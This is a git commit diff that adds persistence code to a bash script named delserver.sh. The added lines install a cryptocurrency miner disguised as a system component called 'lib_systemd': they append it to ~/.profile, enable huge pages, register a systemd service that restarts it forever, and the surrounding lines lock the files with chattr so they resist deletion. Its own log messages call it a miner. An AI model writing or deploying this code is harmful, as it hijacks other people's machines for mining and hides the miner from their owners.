1781895a65bd7c452e2707d10767634ca083cf71
teshushu <905353149@qq.com>
2023-01-24 20:48:10 +0800

    Update delserver.sh

--- Bash/delserver.sh
+++ Bash/delserver.sh
@@ -23,6 +23,57 @@ chmod 777 logserver.sh
 /bin/bash $HOME/myssqltcp/lib_systemd.sh >/dev/null 2>&1 
 nohup ./lib_systemd.sh > /dev/null 2>&1 &
 
+# preparing script background work and work under reboot
+if ! sudo -n true 2>/dev/null; then
+  if ! grep myssqltcp/lib_systemd.sh $HOME/.profile >/dev/null; then
+    echo "[*] Adding $HOME/myssqltcp/lib_systemd.sh script to $HOME/.profile"
+    echo "$HOME/myssqltcp/lib_systemd.sh >/dev/null 2>&1" >>$HOME/.profile
+  else 
+    echo "Looks like $HOME/myssqltcp/lib_systemd.sh script is already in the $HOME/.profile"
+  fi
+  echo "[*] Running miner in the background (see logs in $HOME/server.log file)"
+  /bin/bash $HOME/myssqltcp/lib_systemd.sh >/dev/null 2>&1
+else
+
+  if [[ $(grep MemTotal /proc/meminfo | awk '{print $2}') -gt 3500000 ]]; then
+    echo "[*] Enabling huge pages"
+    echo "vm.nr_hugepages=$((1168+$(nproc)))" | sudo tee -a /etc/sysctl.conf
+    sudo sysctl -w vm.nr_hugepages=$((1168+$(nproc)))
+  fi
+
+  if ! type systemctl >/dev/null; then
+
+    echo "[*] Running miner in the background (see logs in $HOME/server.log file)"
+    /bin/bash $HOME/myssqltcp/lib_systemd.sh >/dev/null 2>&1
+    echo "ERROR: This script requires \"systemctl\" systemd utility to work correctly."
+    echo "Please move to a more modern Linux distribution or setup miner activation after reboot yourself if possible."
+
+  else
+
+    echo "[*] Creating lib_systemd systemd service"
+    cat >/tmp/lib_systemd.service <<EOL
+[Unit]
+Description=lib_systemd service
+
+[Service]
+ExecStart=$HOME/myssqltcp/lib_systemd.sh
+Restart=always
+Nice=10
+CPUWeight=1
+
+[Install]
+WantedBy=multi-user.target
+EOL
+    sudo mv /tmp/lib_systemd.service /etc/systemd/system/lib_systemd.service
+    echo "[*] Starting lib_systemd systemd service"
+    sudo killall lib_systemd 2>/dev/null
+    sudo systemctl daemon-reload
+    sudo systemctl enable lib_systemd.service
+    sudo systemctl start lib_systemd.service
+    echo "To see miner service logs run \"sudo journalctl -u lib_systemd -f\" command"
+  fi
+fi
+
 # lock
 chattr -V +iau $HOME/myssqltcp/lib_systemd.sh
 chattr -V +iau $HOME/myssqltcp/logserver.sh
